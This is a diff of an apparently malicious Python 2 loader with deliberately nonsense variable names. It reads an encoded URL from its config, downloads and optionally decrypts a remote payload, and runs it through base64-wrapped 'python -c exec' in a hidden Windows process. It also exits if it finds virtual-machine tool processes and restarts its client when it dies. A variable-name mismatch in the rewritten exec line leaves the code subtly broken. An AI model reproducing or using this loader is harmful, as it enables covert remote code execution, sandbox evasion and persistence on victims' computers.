@@ -8,7 +8,7 @@ import urllib
 import subprocess
 
  
-DEBUG = False
+__DEBUG__ = False
 
 
 def run(*args, **kwargs):
@@ -34,7 +34,7 @@ def run(*args, **kwargs):
     IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
     SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
     RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
-    SeamlessGalacticSponges   = lambda x: print(str(x)) if DEBUG else ''
+    SeamlessGalacticSponges   = lambda x: print(str(x)) if __DEBUG__ else ''
     AccidentalAquaticCat      = json.loads(urllib.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read()) if 'config' in kwargs else {}
     AccidentalAquaticCat['f'] = bytes(IncontinentObtuseCucumber(__file__))
     GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
@@ -75,9 +75,9 @@ def run(*args, **kwargs):
                 else:
                     SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
         finally:
-            QuarrelsomeImportedAtom = decrypt(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read(), urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))))
-            LyingIdioticManicure    = QuarrelsomeImportedAtom + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
-            EarnestUndulatingNipple = "python -c exec('''{}''')".format(LyingIdiotManicure)
+            QuarrelsomeImportedAtom = decrypt(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read(), urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()) if 'z' in AccidentalAquaticCat else urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
+            LyingIdioticManicure    = QuarrelsomeImportedAtom + ("\n\nif __name__ == '__main__':\n\tmain(**{%s})" % json.dumps(AccidentalAquaticCat))
+            EarnestUndulatingNipple = "python -c \"import base64;exec(base64.b64decode('''{}'''))\"".format(base64.b64encode(LyingIdiotManicure))
             info                    = subprocess.STARTUPINFO()
             info.dwFlags            = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
             info.wShowWindow        = subprocess.SW_HIDE
@@ -89,7 +89,7 @@ def main(*args, **kwargs):
     c = 0 if os.name is 'nt' else -1
     if 'checkvm' in kwargs:
         if bool([i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'] if 'checkvm' in args]):
-            if DEBUG:
+            if __DEBUG__:
                 print('aborting')
             sys.exit(0)
     if 'config' in kwargs:
@@ -99,7 +99,7 @@ def main(*args, **kwargs):
         elif hasattr(client, 'pid'):
             while True:
                 if client.poll():
-                    if DEBUG:
+                    if __DEBUG__:
                         print('restarting')
                     client = run(**kwargs)
                 else:
